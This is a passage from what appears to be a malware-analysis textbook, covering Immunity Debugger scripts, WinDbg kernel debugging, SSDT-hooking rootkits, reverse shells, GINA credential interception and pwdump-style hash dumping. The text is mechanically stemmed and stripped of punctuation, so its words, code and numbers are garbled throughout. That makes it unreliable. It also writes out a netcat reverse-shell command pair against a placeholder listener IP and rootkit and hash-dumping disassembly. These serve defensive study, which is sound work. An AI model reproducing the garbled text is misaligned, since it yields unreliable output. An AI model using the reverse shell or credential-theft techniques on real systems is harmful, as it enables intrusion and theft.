mani util function exampl integr script debugg nativ code order creat custom tabl graph interfac sort popular reason write script malwar analysi includ antidebugg patch inlin function hook function paramet loggingmani found internet common type python script written immdbg known pycommand python script locat pycommand directori instal locat immdbg write script must copi directori abl run python command execut command bar preced list avail pycommand enter list command line pycommand follow structur number import statement use import python modul python script function immdbg access immlib immutil modul main function read commandlin argument pass python list code implement action pycommand return contain string script finish execut main debugg statu bar updat string code exampl show simpl script implement pycommand script use prevent malwar delet file system exampl pycommand script neuter deletefil import immlib def patchdeletefileaimm delfileaddress immgetaddresskerneldeletefilea delfileaddress immlogno deletefil patch return immlogpatch deletefilea patch immassemblexor eax eax n ret immwritememorydelfileaddress patch def mainarg imm immlibdebugg patchdeletefileaimm return deletefilea patch malwar often call deletefil remov file system copi anoth locat run script via scriptnam patch deletefilea function render useless main method defin call patchdeletefilea function defin return address deletefilea call immdbg api function getaddress locat overwrit function code case overwrit patch code code set eax return deletefilea call patch caus deletefil alway fail thu prevent malwar abl remov file system addit inform write python script use python command script immdbg built refer indepth commentari write python script immdbg see gray hat python justin seitz starch press conclus ollydbg popular usermod debugg malwar analysi mani featur help perform dynam malwar analysi youv seen rich interfac provid lot inform debug malwar exampl memori map great way see program laid memori view memori section mani type breakpoint ollydbg use includ condit breakpoint use break paramet function call program access particular region memori ollydbg modifi run binari order forc behavior may normal occur perman save modif made binari disk plugin scriptabl debug use extend function ollydbg provid benefit beyond builtin featur ollydbg popular usermod debugg next chapter focus popular kernelmod debugg windbg sinc ollydbg cant debug kernelmod malwar rootkit devic driver becom familiar windbg want dynam analyz malwar typelab lab analyz malwar found file labex use ollydbg ida pro answer follow question malwar initi analyz chapter lab use basic static dynam analysi techniqu question q get malwar instal q commandlin option program password requir q use ollydbg perman patch malwar doesnt requir special commandlin password q hostbas indic malwar q differ action malwar instruct take via network q use networkbas signatur malwar lab analyz malwar found file labex use ollydbg answer follow question question q string see static binari q happen run binari q get sampl run malici payload q happen x q argument pass subroutin x q domain name malwar use q encod routin use obfusc domain name q signific createprocessa call xelab analyz malwar found file labex use ollydbg ida pro malwar load three includ dll dlldll dlldll dlldll built request memori load locat therefor view dll ollydbg versu ida pro code may appear differ memori locat purpos lab make comfort find correct locat code within ida pro look code ollydbg question q dll import labex q base address request dlldll dlldll dlldll q use ollydbg debug labex assign base address dlldll dlldll dlldll q labex call import function dlldll import function q labex call writefil filenam write q labex creat job use netschedulejobadd get data second paramet q run debug program see print three piec mysteri data follow dll mysteri data dll mysteri data dll mysteri data q load dlldll ida pro match load address use ollydbgchapt kernel debug windbg windbg often pronounc windbag free debugg microsoft popular ollydbg malwar analysi windbg mani advantag signific kernel debug chapter explor way use windbg kernel debug rootkit analysi windbg support usermod debug much inform chapter applic user mode kernel mode focu kernel mode malwar analyst use ollydbg usermod debug windbg also use featur monitor interact window well extens help file driver kernel code begin debug malici kernel code need understand kernel code work malwar writer use uniqu challeng present window devic driver commonli refer simpli driver allow thirdparti develop run code window kernel driver difficult analyz load memori stay resid respond request applic complic applic directli interact kernel driver instead access devic object send request particular devic devic necessarili physic hardwar compon driver creat destroy devic access user space exampl consid usb flash drive driver system handl usb flash drive applic make request directli driver make request specif devic object instead user plug usb flash drive comput window creat f drive devic object drive applic make request f drive ultim sent driver usb flash drive driver might handl request second usb flash drive applic would access differentdevic object g drive order system work properli driver must load kernel dll load process driver first load driverentri procedur call similar dllmain dll unlik dll expos function export tabl driver must regist address callback function call userspac softwar compon request servic registr happen driverentri routin window creat driver object structur pass driverentri routin driverentri routin respons fill structur callback function driverentri routin creat devic access user space userspac applic interact driver send request devic consid read request program user space request eventu rout driver manag hardwar store data read usermod applic first obtain file handl devic call readfil handl kernel process readfil request eventu invok driver callback function respons handl read io request commonli encount request malici kernel compon deviceiocontrol gener request userspac modul devic manag driver userspac program pass arbitrari length buffer data input receiv arbitrari length buffer data output call usermod applic kernelmod driver difficult trace os code support call way illustr figur show request usermod applic eventu reach kernel mode driver request origin usermod program eventu reach kernel request sent driver control hardwar other affect intern kernel statefigur usermod call handl kernel note kernelmod malwar signific usermod compon creat devic object kernelmod driver execut malici driver gener usual control hardwar instead interact main window kernel compon ntoskrnlex haldll ntoskrnlex compon code core os function haldll code interact main hardwar compon malwar often import function one file order manipul kernelset kernel debug debug kernel complic debug userspac program kernel debug os frozen imposs run debugg therefor common way debug kernel vmware unlik usermod debug kernel debug requir certain amount initi setup need set virtual machin enabl kernel debug configur vmware enabl virtual serial port virtual machin host configur windbg host machin need set virtual machin edit normal hidden c bootini file sure folder option set show hidden file start edit bootini file take snapshot virtual machin make mistak corrupt file revert snapshot exampl show window bootini line ad enabl kernel debug exampl sampl bootini file modifi enabl kernel debug boot loader timeout defaultmultidiskrdiskpartitionwindow oper system multidiskrdiskpartitionwindowsmicrosoft window xp profession noexecuteoptin fastdetect multidiskrdiskpartitionwindowsmicrosoft window xp profession kernel debug noexecuteoptin fastdetect debug debugportcom baudrat line specifi os loadwindow xp case line ad enabl kernel debug version bootini like contain line similar copi last line bootini file add anoth entri line except add option debug debugportcom baudrat dont worri element line multidisk simpli copi line exactli add extra option debug flag enabl kernel debug debugportcom tell os port connect debug machin debug machin thebaudr specifi speed connect case well use virtual com port creat vmware also chang name window second entri recogn option later case name second entri microsoft window xp profession kernel debug next time boot virtual machin given option boot debuggeren version os boot loader give second decid whether want boot debug enabl time boot must choos debuggeren version want abl connect kernel debugg note simpli start os debugg enabl mean requir attach debugg os run fine without debugg attach next configur vmware creat virtual connect virtual machin host os well use serial port name pipe host ad new devic follow step add new devic click vm set open vmware set dialog set dialog click add button lower right select serial port window contain type devic dialog request type serial port select output name pipe next window enter pipecom name socket select end server end applic youv finish ad serial port virtual machin set show serial port devic configur shown figur check box label yield cpu poll note exact sequenc window dialog box differ version vmware instruct specif vmware workstat set version window dialog configur set differ slightlyfigur ad serial port virtual machin youv configur virtual machin start use follow step host machin use windbg connect virtual machin start debug kernel launch windbg select file kernel debug click com tab enter filenam baud rate set bootini file case make sure pipe checkbox check select ok window look like figur figur start kernel debug session windbg virtual machin run debugg connect within second run debugg wait os boot connect boot process debugg connect consid enabl verbos output kernel debug youll get complet pictur happen verbos output notifi time driver load unload help identifi malici driver casesus windbg windbg use commandlin interfac function cover import command brows complet list command windbg help menu read memori windbg memori window support memori brows directli command line command use read locat memori program data stack follow basic syntax x addresstoread x one sever option data display tabl show common way data display tabl windbg read option option descript da read memori display ascii text du read memori display unicod text dd read memori display bit doubl word exampl display string offset x would use command da x e command use way chang memori valu use follow syntax e x addresstowrit datatowrit x valu valu use x command youll find mani addit option document help file use arithmet oper perform oper memori regist directli command line use simpl arithmet oper addit subtract multipl divis commandlin option use shortcut tri creat express condit breakpoint dwo command use derefer bit pointer see valu locat exampl breakpoint function first argument wide charact string view string command du dwo esp esp locat argument dwo oper identifi locat pointer string du tell windbg display wide charact string locat set breakpoint bp command use set basic breakpoint windbg also specifi command run automat breakpoint hit prior control pass user use go g command breakpoint perform action continu without wait user exampl follow command print second argument everi time getprocaddress function call without actual stop program execut bp getprocaddress da dwoesp g exampl print function name request everi call getprocaddress use featur breakpoint execut much faster return control user wait user issu command command string becom fairli sophist support condit statement statement loop windbg support script use command note command sometim attempt access invalid memori locat exampl second argument getprocaddress either string ordin number argument ordin number windbg tri derefer invalid memori locat luckili wont crash simpli print valu address list moduleswindbg featur similar ollydbg memori map lay memori segment load modul altern windbg lm command list modul load process includ execut dll user space kernel driver kernel mode start address end address modul list wellmicrosoft symbol debug symbol provid limit inform sourc code help understand assembl code symbol provid microsoft contain name certain function variabl symbol context simpli name particular memori address symbol provid name address repres function provid name address repres data address exampl without symbol inform function address fa label symbol inform configur windbg tell function name mmcreateprocessaddressspac assum name function address address wouldnt know much function name tell us function creat address space process also use symbol name find function data memori search symbol format refer symbol windbg follow modulenam symbolnam syntax use anywher normal address modulenam name exe dll sy file contain symbol without extens symbolnam name associ address howev ntoskrnlex special case modul name nt ntoskrnl exampl want look disassembl ntcre ateprocess function ntoskrnlex would use disassembl command u stand unassembl paramet ntntcreateprocess dont specifi librari name windbg search load modul match symbol take long time must load search symbol everi modul bu command allow use symbol set defer breakpoint code isnt yet load defer breakpoint breakpoint set modul load match specifi name exampl command bu newmoduleexportedfunct instruct windbg set breakpoint exportedfunct soon modul load name newmodul analyz kernel modul particularli use combin iment command determin entri point given modul command bu iment drivernam set breakpoint entri point driver driver code chanc run x command allow search function symbol use wildcard exampl your look kernel function perform process creation search function within ntoskrnlex includ string createprocess command x ntcreateprocess display export function well intern function follow output x ntcreateprocess x ntcreateprocess ca ntntcreateprocessex type inform c ntntcreateprocess type inform cac ntpspcreateprocess type inform fe ntzwcreateprocess type inform fe ntzwcreateprocessex type inform ntpspcreateprocessnotifyroutinecount type inform cea ntpssetcreateprocessnotifyroutin type inform fa ntmmcreateprocessaddressspac type inform ae ntpspcreateprocessnotifyroutin type inform anoth use command ln command list closest symbol given memori address use determin function pointer direct exampl let say see call function address xaa want know purpos code address could issu follow command ln aa kd ln ntreadfil aa ntntreadfil ntntreadfilescatt exact match ntntreadfil type inform first line show two closest match last line show exact match first line display exact match view structur inform microsoft symbol also includ type inform mani structur includ intern type document elsewher use malwar analyst sinc malwar often manipul undocu structur exampl show first line driver object structur storesinform kernel driver exampl view type inform structur dt nt driver object kd dt nt driver object x type intb x size intb x deviceobject ptr devic object x flag uintb xc driverstart ptr void x drivers uintb x driversect ptr void x driverextens ptr driver extens xc drivernam unicod string x hardwaredatabas ptr unicod string x fastiodispatch ptr fast iodispatch xc driverinit ptr long x driverstartio ptr void x driverunload ptr void x majorfunct ptr long structur name hint data store within structur exampl offset xc pointer reveal driver load memori windbg allow overlay data onto structur let say know driver object offset b want show structur along valu particular driver exampl show accomplish exampl overlay data onto structur kd dt nt driver object b x type x size x deviceobject xba devic object x flag x xc driverstart xfadb x drivers x x driversect xadd x driverextens xbf driver extens xc drivernam unicod string driverbeep x hardwaredatabas xae unicod string registrymachin hardwaredescriptionsystem x fastiodispatch null xc driverinit xfadbc long beepdriverentri x driverstartio xfadba void beepbeepstartio x driverunload xfadb void beepbeepunload x majorfunct xfadba long beepbeepopen beep driver built window make beep nois someth wrong see initi function call whenth driver load locat offset xfadbc malici driver would want see code locat address code alway call first driver load initi function function call everi time driver load malwar sometim place entir malici payload function configur window symbol symbol specif version file analyz chang everi updat hotfix configur properli windbg queri microsoft server automat get correct symbol file current debug set symbol file path select file symbol file path configur windbg use onlin symbol server enter follow path srvcwebsymbolshttpmsdlmicrosoftcomdownloadsymbol srv configur server path cwebsymbol local cach symbol inform url fix locat microsoft symbol server your debug machin continu connect internet manual download symbol microsoft download symbol specif os servic pack architectur use symbol file usual coupl hundr megabyt contain symbol inform differ hotfix patch version os servic packkernel debug practic section well examin program write file kernel space malwar author benefit write file kernel space difficult detect isnt stealthiest way write file get past certain secur product mislead malwar analyst look telltal call user space createfil writefil function normal win function easili access kernel mode present challeng malwar author similar function use regularli malwar written kernel sinc createfil writefil function avail kernel mode ntcreatefil ntwritefil function use instead look userspac code exampl userspac compon creat driver read write file kernel first look userspac code ida pro investig function call interact driver shown exampl exampl creat servic load kernel driver bd push esi lppassword push esi lpservicestartnam bf push esi lpdepend b push esi lpdwtagid b push esi lploadordergroup b push ebplpbinarypathnam lpbinarypathnam b push dwerrorcontrol b push dwstarttyp b push dwservicetyp bb push fffh dwdesiredaccess b push ebplpdisplaynam lpdisplaynam b push ebplpdisplaynam lpservicenam b push ebphscmanag hscmanag b call dsimpcreateservicea see servic manag routin driver creat createservic function note paramet dwservic type x valu indic kernel driver see exampl file creat get handl devic call createfilea filenam push onto stack store inedi pictur edi load string filewriterdevic name object creat driver userspac applic access exampl obtain handl devic object xor eax eax push eax htemplatefil push h dwflagsandattribut b push dwcreationdisposit push eax lpsecurityattribut e push eax dwsharemod f push ebx dwdesiredaccess push edi lpfilenam call esi createfilea malwar handl devic use deviceiocontrol function send data driver shown exampl exampl use deviceiocontrol commun user space kernel space push lpoverlap sub eax ecx lea ecx ebpbytesreturn push ecx lpbytesreturn b push h noutbuffers push edi lpoutbuff e inc eax f push eax ninbuffers push esi lpinbuff push ch dwiocontrolcod push ebphobject hdevic c call dsdeviceiocontrol look kernelmod code point well switch gear look kernelmod code dynam analyz code execut result deviceiocontrol call debug kernel first step find driver kernel your run windbg kernel debugg attach verbos output enabl alert whenev kernel modul load kernel modul load unload often debug malwar kernel modul load suspici modul notewhen use vmware kernel debug see kmixersi frequent load unload normal associ malici activ follow exampl see filewritersi driver load kernel debug window like malici driver modload fbd fbe filewritersi determin code call malici driver need find driver object sinc know driver name find driver object drvobj command exampl show exampl output exampl view driver object load driver kd drvobj filewrit driver object e load symbol fbd filewritersi filewritersi error modul load complet symbol could load filewritersi driverfilewrit driver extens list id addr devic object list eb note sometim driver object differ name drvobj fail altern brows driver object object driver command command list object driver namespac one root namespac discuss chapter driver object store address xe address driver object look structur use dt command shown exampl exampl view devic object kernel kddt nt driver object xe nt driver object x type x size x deviceobject xeb devic object x flag x xc driverstart xfbd x drivers x x driversect xa x driverextens xe driver extens xc drivernam unicod string driverfilewrit x hardwaredatabas xecd unicod string registrymachin hardwaredescriptionsystem x fastiodispatch null xc driverinit xfbdfcd long x driverstartio null x driverunload xfbdaa void x majorfunct xfbda long entri majorfunct structur pointer first entri major function tabl major function tabl tell us execut malici driver call user space tabl differ function index index repres differ type request indic found file wdmh start irpmj exampl want find offset tabl call userspac applic call deviceiocontrol would look index irpmj devic control case irpmj devic control valu xe major function tabl start offset x begin driver object find function call handl deviceiocontrol request use command dd exe l x offset begin tabl xe index irpmj devic control multipli pointer byte l argument specifi want see one dword output preced command show function call kernel xfbda shown exampl check see instruct address look valid use u command case could mean made error address calcul exampl locat function irpmj devic control driver object kd dd exe l e fbda kd u fbda filewriterxa fbda push h fbda dbf push offset filewriterx fbd fbdad efaffff call filewriterx fbd address either load kernel driver ida pro set breakpoint function continu analyz within windbg usual easier start analyz function ida pro use windbg analysi need scan ida pro output malici exampl driver found code exampl call zwcreatefil zwwritefil write file kernel spaceexampl code list irpmj devic control function fbdcb push offset adosdevicescsec dosdevicescsecretfiletxt fbdcb lea eax ebph fbdcb push eax destinationstr fbdcba call dsrtlinitunicodestr fbdcc mov dword ptr ebph h fbdcc mov ebph ebx fbdcca mov dword ptr ebph h fbdcd lea eax ebph fbdcd mov ebpch eax fbdcd mov ebph ebx fbdcda mov ebph ebx fbdcdd push ebx ealength fbdcde push ebx eabuff fbdcdf push h createopt fbdce push createdisposit fbdce push ebx shareaccess fbdce push h fileattribut fbdce push ebx allocations fbdcea lea eax ebpch fbdced push eax iostatusblock fbdcee lea eax ebph fbdcf push eax objectattribut fbdcf push fffh desiredaccess fbdcf push offset filehandl filehandl fbdcfc call dszwcreatefil fbdd push ebx key fbdd lea eax ebpch fbdd push eax byteoffset fbdd push dword ptr ebph length fbdda push esi buffer fbddb lea eax ebpch fbdde push eax iostatusblock fbddf push ebx apccontext fbdd push ebx apcroutin fbdd push ebx event fbdd push filehandl filehandl fbdd call dszwwritefil window kernel use unicodestr structur differ wide charact string user space rtlinitunicodestr function use creat kernel string second paramet function null termin wide charact string unicodestr creat filenam zwcreatefil function dosdevicescsecretfiletxt creat file within kernel must specifi fulli qualifi object name identifi root devic involv devic familiar object name preced dosdevic deviceiocontrol function send data user space kernel driver createfil readfil writefil function alsodo exampl usermod applic call readfil handl devic irpmjread function call exampl found function deviceiocontrol ad xe begin major function tabl irpmj devic control valu xe find function read request add x begin major function tabl instead xe valu irpmjread x find driver object previou exampl saw driver load kernel space ran malwar assum infect driver sometim driver object difficult find tool help understand tool work recal applic interact devic driver userspac applic identifi devic object use devic object find driver object use devobj command get devic object inform use name devic specifi createfil call userspac code kd devobj filewriterdevic devic object eb rootkit driverfilewrit driverobject e current irp refcount type flag dacl edeedc devext devobjext ebe extensionflag devic queue busi devic object provid pointer driver object address driver object find major function tabl youv identifi malici driver might still need figur applic use one output devobj command ran handl devic object use handl devhandl command obtain list userspac applic handl devic command iter everi handl tabl everi process take long time follow abbrevi output devhandl command reveal filewriterappex applic use malici driver case kddevhandl eb check handl tabl process xf handl tabl ed entri usecheck handl tabl process xd handl tabl ecfa entri use check handl tabl process xda handl tabl e entri use process da sessionid cid peb ffd parentcid c dirbas objectt eda handlecount imag filewriterappex b object ebe grantedaccess f know applic affect find user space analyz use techniqu discuss throughout book cover basic analyz malici kernel driver next well turn techniqu analyz rootkit usual implement kernel driverrootkit rootkit modifi intern function os conceal exist modif hide file process network connect resourc run program make difficult antiviru product administr secur analyst discov malici activ major rootkit use oper somehow modifi kernel although rootkit employ divers array techniqu practic one techniqu use system servic descriptor tabl hook techniqu sever year old easi detect rel rootkit techniqu howev still use malwar easi understand flexibl straightforward implement system servic descriptor tabl ssdt sometim call system servic dispatch tabl use intern microsoft look function call kernel isnt normal access thirdparti applic driver recal chapter kernel code access user space via syscal sysent int xe instruct modern version window use sysent instruct get instruct function code store regist eax exampl show code ntdlldll implement ntcreatefil function must handl transit user space kernel space happen everi time ntcreatefil call exampl code ntcreatefil function cd mov eax h ntcreatefil cd mov edx ffeh cdc call dword ptr edx cde retn ch call dword ptredx go follow instruct cebb bd mov edxesp cebd f sysent eax set x exampl stack pointer save edx sysent instruct call valu eax function number ntcreatefil use index ssdt code enter kernel specif address offset x ssdt call kernel mode exampl show entri ssdt theentri ntcreatefil shown offset exampl sever entri ssdt tabl show ntcreatefil ssdtx bbc ntcreateadirectoryobject ssdtx ntcreateev ssdtx ntcreateeventpair ssdtx dca ntcreatefil ssdtx bcc ntcreateiocomplet ssdtx caca ntcreatejobobject rootkit hook one function chang valu ssdt rootkit code call instead intend function kernel preced exampl entri x would chang point function within malici driver chang modifi function imposs open examin malici file normal implement rootkit call origin ntcreatefil filter result base set rootkit rootkit simpli remov file want hide order prevent applic obtain handl file rootkit hook ntcreatefil prevent file visibl directori list lab chapter youll see realist rootkit hide file directori list rootkit analysi practic well look exampl rootkit hook ssdt well analyz hypothet infect system think may malici driver instal first obviou way check ssdt hook examin ssdt ssdt view windbg offset store ntkeservicedescriptort function offset ssdt point function within boundari nt modul first thing obtain boundari case ntoskrnlex start address end cd rootkit hook one function function probabl point nt modul examin ssdt see function look like fit exampl shorten version ssdt exampl sampl ssdt tabl one entri overwritten rootkit kd lm nt c c cd aea aa c abe cbbc cb c feed bc ae f c b bc e c edb e caa e c f cc bbc c fada bcc caca c ca e dd c ac fba cfe valu offset x tabl point function outsid ntoskrnl modul rootkit like hook function function hook case ntcreatefil figur function hook examin ssdt system without rootkit instal see function locat offset find modul contain hook address list open modul lm command shown exampl kernel modul list driver find driver contain address xfada see within driver call rootkit exampl use lm command find driver contain particular address kdlm fac fac intelid defer fac faca dmload defer fad fada rootkit defer fa faee vmmous defer identifi driver look hook code start analyz driver well look two thing section code instal hook function execut hook simplest way find function instal hook search ida pro data refer hook function exampl assembl list code hook ssdt exampl rootkit code instal hook ssdt dd push offset antcreatefil ntcreatefil lea eax ebpntcreatefilenam push eax destinationstr mov edi dsrtlinitunicodestr dc call edi rtlinitunicodestr de push offset akeservicedescr keservicedescriptort lea eax ebpkeservicedescriptortablestr push eax destinationstr call edi rtlinitunicodestr lea eax ebpntcreatefilenamedc push eax systemroutinenam dd mov edi dsmmgetsystemroutineaddress call edi mmgetsystemroutineaddress mov ebx eax lea eax ebpkeservicedescriptortablestr da push eax systemroutinenam db call edi mmgetsystemroutineaddress dd mov ecx eax df xor edx edx code xref subc j add ecx cmp ecx ebx jz short locd inc edx cmp edx ch df jl short locd code xref subcef j mov dwordac ecx mov dworda ebx dd mov dword ptr ecx offset suba code hook ntcreatefil function first two function call creat string ntcreatefil keservicedescriptort use find address export export ntoskrnlex import kernel driver like valu export also retriev runtim cant load getprocaddress kernel mode mmgetsystemroutineaddress kernel equival although slightli differ getprocaddress get address export hal ntoskrnl kernel modul first call mmgetsystemroutineaddress reveal address ntcreatefil function use malwar determin address ssdt overwrit second call mmgetsystemroutineaddress give us address ssdt next loop iter ssdt find valu match address ntcreatefil overwrit function hook hook instal last instruct list wherein procedur address copi memori locat hook function perform simpl task filter certain request allow other pass origin ntcreatefil exampl show hook functionexampl list rootkit hook function mov edi edi push ebp mov ebp esp push ebparg ac call sub b test eax eax b jz short locbb b pop ebp b jmp ntcreatefil bb bb code xref subaf j bb mov eax ch c pop ebp c retn ch hook function jump origin ntcreatefil function request return xc other valu xc correspond statusobjectnamenotfound call contain code shown evalu objectattribut contain inform object filenam file userspac program attempt open hook function return nonzero valu ntcreatefil function allow proceed zero rootkit block file open hook function return zero userspac applic receiv error indic file exist prevent user applic obtain handl particular file interf call ntcreatefil interrupt interrupt sometim use rootkit interfer system event modern processor implement interrupt way hardwar trigger softwar event command issu hardwar hardwar interrupt processor action complet interrupt sometim use driver rootkit execut code driver call ioconnectinterrupt regist handler particular interrupt code specifi interrupt servic routin isr os call everi time interrupt code gener interrupt descriptor tabl idt store isr inform view idt command exampl show normal idt wherein interrupt go wellknown driver sign microsoftexampl sampl idt kd idt cf halpicspuriousservic db halhalpapcinterrupt dcc halhalpdispatchinterrupt cf halhalpapicrebootservic atapiideportinterrupt kinterrupt ba ef ndisndismisr kinterrupt ef b portclscksshellrequestorvector delet destructorx kinterrupt b usbportusbportinterruptservic kinterrupt df dd atapiideportinterrupt kinterrupt e scsiportscsiportinterrupt kinterrupt e cc iprtikeyboardinterruptservic kinterrupt c c iprtimouseinterruptservic kinterrupt c b e acpiacpiinterruptserviceroutin kinterrupt ef b fc serialserialcisrsw kinterrupt f c cf halhalpbroadcastcallservic ced halhalpclockinterrupt e cffc halhalpipihandl e cfc halhalplocalapicerrorservic fd halhalpprofileinterrupt fe halhalpperfinterrupt interrupt go unnam unsign suspici driver could indic rootkit malici softwareload driver throughout chapter assum malwar analyz includ userspac compon load malici driver userspac applic instal load driver use loader osr driver loader tool shown figur driver loader easi use free requir registr osr driver loader instal simpli run driver loader specifi driver load click regist servic start servic start driver figur osr driver loader tool windowkernel issu window vista window x version sever major chang made newer version window impact kerneldebug process effect kernel malwar malwar still target x machin run window xp window x gain popular malwar target system one major chang sinc window vista bootini file longer use determin os boot recal use bootini file enabl kernel debug earlier chapter vista later version window use program call bcdedit edit boot configur data would use bcdedit enabl kernel debug newer window oss biggest secur chang implement kernel protect patch mechan commonli call patchguard implement x version window start window xp kernel patch protect prevent thirdparti code modifi kernel includ modif kernel code modif system servic tabl modif idt patch techniqu featur somewhat controversi introduc kernel patch use malici program nonmalici program exampl firewal antiviru program secur product regularli use kernel patch detect prevent malici activ kernel patch protect also interfer debug bit system debugg patch code insert breakpoint kernel debugg attach os boot time patch protect run howev attach kernel debugg boot patchguard caus system crash driver sign enforc bit version window start vista mean cant load driver window vista machin unless digit sign malwar usual sign effect secur measur malici kernel driver fact kernel malwar x system practic nonexist x version window becom preval malwar undoubtedli evolv work around barrier need loadan unsign driver x vista system use bcdedit util modifi boot option specif nointegritycheck disabl requir driver signedconclus windbg use debugg provid number featur ollydbg includ abil debug kernel malwar use kernel common exist malwar analyst know handl chapter weve cover kernel driver work use windbg analyz find kernel code execut user space applic make request analyz rootkit next sever chapter well shift discuss analysi tool malwar oper local system across networklab lab lab includ driver execut run execut anywher order program work properli driver must place cwindowssystem directori origin found victim comput execut labex driver labsi question q program make direct chang registri use procmon check q userspac program call controlservic function set breakpoint windbg see execut kernel result call controlservic q program lab file lab labex question q program creat file q program kernel compon q program lab lab includ driver execut run execut anywher order program work properli driver must place cwindowssystem directori origin found victim comput execut labex driver labsi question q program q program run stop itq kernel compon dopart iv malwar functionalitychapt malwar behavior far weve focus analyz malwar lesser extent malwar goal next three chapter familiar common characterist softwar identifi malwar chapter take kind whirlwind tour variou malwar behavior may alreadi familiar goal provid summari common behavior give wellround foundat knowledg allow recogn varieti malici applic cant possibl cover type malwar new malwar alway creat seemingli endless capabl give good understand sort thing look download launcher two commonli encount type malwar download launcher download simpli download anoth piec malwar internet execut local system download often packag exploit download commonli use window api urldownloadtofilea follow call winexec download execut new malwar launcher also known loader execut instal malwar immedi futur covert execut launcher often contain malwar design load discuss launcher extens chapter backdoor backdoor type malwar provid attack remot access victim machin backdoor commonli found type malwar come shape size wide varieti capabl backdoor code often implement full set capabl use backdoor attack typic dont need download addit malwar code backdoor commun internet numer way common method port use http protocol http commonli use protocol outgo network traffic offer malwar best chanc blend rest traffic chapter see analyz backdoor packet level creat effect network signatur focu highlevel commun backdoor come common set function abil manipul registri key enumer display window creat directori search file determin featur implement backdoor look window function use import see appendix list common function tell piec malwar revers shell revers shell connect origin infect machin provid attack shell access machin revers shell found standalon malwar compon sophist backdoor revers shell attack execut command local system netcat revers shell netcat discuss chapter use creat revers shell run two machin attack known use netcat packag netcat within malwar netcat use revers shell remot machin wait incom connect use followingnc l p l option set netcat listen mode p use set port listen next victim machin connect provid shell use follow command nc listenerip e cmdex listenerip part ip address port remot machin e option use design program execut connect establish tie standard input output program socket window cmdex often use discuss next window revers shell attack employ two simpl malwar code implement revers shell window use cmdex basic multithread basic method popular among malwar author sinc easier write gener work well multithread techniqu involv call createprocess manipul startupinfo structur pass createprocess first socket creat connect remot server establish socket tie standard stream standard input standard output standard error cmdex createprocess run cmdex window suppress hide victim exampl method chapter multithread version window revers shell involv creation socket two pipe two thread look api call createthread createpip method sometim use malwar author part strategi manipul encod data come go socket createpip use tie togeth read write end pipe standard input stdin standard output stdout createprocess method use tie standard stream pipe instead directli socket createprocess call malwar spawn two thread one read stdin pipe write socket read socket write stdout pipe commonli thread manipul data use data encod well cover chapter reverseengin encodingdecod routin use thread decod packet capturescontain encod session rat remot administr tool rat use remot manag comput comput rat often use target attack specif goal steal inform move later across network figur show rat network structur server run victim host implant malwar client run remot command control unit oper attack server beacon client start connect control client rat commun typic common port like figur rat network structur note poison ivi httpwwwpoisonivyratcom freeli avail popular rat function control shellcod plugin make extens poison ivi use tool quickli gener malwar sampl test analyz botnet botnet collect compromis host known zombi control singl entiti usual use server known botnet control goal botnet compromis mani host possibl order creat larg network zombi botnet use spread addit malwar spam perform distribut denialofservic ddo attackbotnet take websit offlin zombi attack websit time rat botnet compar key differ botnet rat botnet known infect control million host rat typic control far fewer host botnet control rat control pervictim basi attack interact host much intim level rat use target attack botnet use mass attackscredenti stealer attack often go great length steal credenti primarili three type malwar program wait user log order steal credenti program dump inform store window password hash use directli crack offlin program log keystrok section discuss type malwar gina intercept window xp microsoft graphic identif authent gina intercept techniqu malwar use steal user credenti gina system intend allow legitim third parti custom logon process ad support thing like authent hardwar radio frequenc identif rfid token smart card malwar author take advantag thirdparti support load credenti stealer gina implement dll msginadl load winlogon execut login process winlogon also work thirdparti custom implement dll load winlogon gina dll like maninthemiddl attack window conveni provid follow registri locat thirdparti dll found load winlogon hklmsoftwaremicrosoftwindow ntcurrentversionwinlogonginadl one instanc found malici file fsginadl instal registri locat gina interceptor figur show exampl way logon credenti flow system malici file winlogon msginadl malwar fsginadl abl captur user credenti submit system authent log inform disk pass networkfigur malici fsginadl sit window system file captur data fsginadl intercept commun winlogon msginadl must pass credenti inform msginadl system continu oper normal order malwar must contain dll export requir gina specif must export function prepend wlx clearli find analyz dll mani export function begin string wlx good indic examin gina interceptor export simpli call real function msginadl case fsginadl wlxloggedoutsa export call real function exampl show wlxloggedoutsa export fsginadl exampl gina dll wlxloggedoutsa export function log stolen credenti wlxloggedoutsa push esi push edi push offset awlxloggedout wlxloggedoutsa call callmsginadllfunct fb push eax arg fc push offset ausdspsop u p op push offset adriv driverstcpudpsi call logtofil see credenti inform immedi pass msginadl call label callmsginadllfunct function dynam resolv call wlxloggedoutsa msginadl pass paramet call perform log take paramet credenti inform format string use print credenti log filenam result success user logon log systemrootsystemdriverstcpudpsi log includ usernam domain password old password hash dumpingdump window hash popular way malwar access system credenti attack tri grab hash order crack offlin use passthehash attack passthehash attack use lm ntlm hash authent remot host use ntlm authent without need decrypt crack hash obtain plaintext password log pwdump passthehash psh toolkit freeli avail packag provid hash dump sinc tool open sourc lot malwar deriv sourc code antiviru program signatur default compil version tool attack often tri compil version order avoid detect exampl section deriv version pwdump psh encount field pwdump set program output lm ntlm password hash local user account secur account manag sam pwdump work perform dll inject insid local secur author subsystem servic lsass process better known lsassex well discuss dll inject depth chapter know way malwar run dll insid anoth process therebi provid dll privileg process hash dump tool often target lsassex necessari privileg level well access mani use api function standard pwdump use dll lsaextdll run insid lsassex pwdump call gethash export lsaextdll order perform hash extract extract use undocu window function call enumer user system get password hash unencrypt form user deal pwdump variant need analyz dll order determin hash dump oper start look dll export default export name pwdump gethash attack easili chang name make less obviou next tri determin api function use export mani function dynam resolv hash dump export often call getprocaddress mani time exampl show code export function grabhash pwdump variant dll sinc dll inject lsassex must manual resolv numer symbol use themexampl uniqu api call use pwdump variant export function grabhash f push offset libfilenam samsrvdll call esi loadlibrarya push offset aadvapidl advapidl call esi loadlibrarya b push offset procnam samiconnect push ebx hmodul call esi getprocaddress push offset asamrqu samrqueryinformationus push ebx hmodul c call esi getprocaddress c push offset asamigetpriv samigetprivatedata c push ebx hmodul cd call esi getprocaddress cf push offset asystemfuncti systemfunct push edi hmodul da call esi getprocaddress dc push offset asystemfuni systemfunct e push edi hmodul e call esi getprocaddress exampl show code obtain handl librari samsrvdll advapidl via loadlibrari samsrvdll contain api easili access sam advapidl resolv access function alreadi import lsassex pwdump variant dll use handl librari resolv mani function import five shown list look getprocaddress call paramet interest import resolv samsrvdll samiconnect samrqueryinformationus samigetprivatedata later code samiconnect use connect sam follow call samrqueryinformationus user system hash extract samigetprivatedata decrypt systemfunct systemfunct import advapidl seen none api function list document microsoft psh toolkit contain program dump hash popular known whostherealt whostherealt dump sam inject dll lsassex use complet differ set api function pwdumpexampl show code whostherealt variant export function name 